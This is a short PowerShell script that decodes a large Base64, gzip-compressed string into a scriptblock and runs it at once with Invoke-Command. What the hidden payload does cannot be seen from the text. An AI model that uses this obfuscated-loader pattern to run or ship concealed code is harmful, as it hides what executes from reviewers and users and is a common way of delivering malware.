
$EncodedScript = "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"

function Convert-MyScriptScriptBlock {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeLine = $True, HelpMessage = "The Code")]
        [string]$ScriptBlock
    )
    process {
        # Take my B64 string and do a Base64 to Byte array conversion of compressed data
        $ScriptBlockCompressed = [System.Convert]::FromBase64String($ScriptBlock)

        # Then decompress script's data
        $InputStream = New-Object System.IO.MemoryStream (, $ScriptBlockCompressed)
        $GzipStream = New-Object System.IO.Compression.GzipStream $InputStream, ([System.IO.Compression.CompressionMode]::Decompress)
        $StreamReader = New-Object System.IO.StreamReader ($GzipStream)
        $ScriptBlockDecompressed = $StreamReader.ReadToEnd()
        # And close the streams
        $GzipStream.Close()
        $InputStream.Close()

        $ScriptBlockDecompressed
    }
}

$DecodedScript = Convert-MyScriptScriptBlock $EncodedScript

[scriptblock]$sb = [scriptblock]::Create($DecodedScript)
Invoke-Command -ScriptBlock $sb


